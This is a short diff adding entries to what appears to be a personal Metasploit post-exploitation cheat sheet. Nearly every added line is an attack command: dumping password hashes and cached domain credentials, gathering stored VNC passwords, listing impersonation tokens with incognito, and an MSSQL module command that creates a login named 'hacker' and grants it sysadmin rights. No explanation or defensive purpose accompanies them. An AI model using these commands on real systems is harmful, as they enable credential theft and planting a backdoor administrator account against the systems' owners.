@@ -455,3 +455,18 @@ run post/windows/gather/credentials/vnc
 run post/windows/gather/cachedump
 use incognito
 list_tokens -u
+==========
+
+hashdump
+run post/windows/gather/cachedump
+use incognito
+list_tokens -u
+
+<add user>
+sysinfo
+
+run post/windows/gather/credentials/vnc
+——————————————————————————————
+
+auxiliary(mssql_sql) > set sql EXEC sp_addlogin hacker, password;EXEC master.dbo.sp_addsrvrolemember hacker, sysadmin;  —priv
+run
